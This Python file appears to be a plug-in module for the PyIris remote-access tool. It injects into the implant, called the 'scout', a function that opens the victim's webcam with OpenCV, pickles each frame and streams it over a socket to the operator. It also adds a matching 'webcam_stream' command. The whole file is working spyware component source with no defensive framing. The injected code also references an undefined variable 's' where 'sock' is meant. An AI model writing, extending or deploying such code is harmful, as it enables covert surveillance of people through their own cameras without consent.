import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pickle')
        config.import_statements.append('import cv2')
        config.functions.append('''
def webcam_stream(sock):
    camera = cv2.VideoCapture(0)
    while True:
        ret, frame = camera.read()
        if ret:
            framebytes = pickle.dumps(frame)
            send_all(sock, framebytes)
            ack_packet = recv_all(s)
            if ack_packet == '1':
                send_all(sock, "[From scout] Acknowledged kill webcam stream")
                return
        else:
            send_all(sock, "[-]Hit an unexpected error while capturing frames from user webcam")''')
        config.logics.append('''
            elif command == "webcam_stream":
                webcam_stream(s)''')
        config.help_menu['webcam_stream'] = 'Stream clients webcam to PyIris'
    elif option == 'info':
        print('\nName             : Webcam streaming component' \
              '\nOS               : Linux' \
              '\nRequired Modules : pickle, cv2' \
              '\nCommands         : webcam_stream' \
              '\nDescription      : Stream clients webcam to PyIris\n')
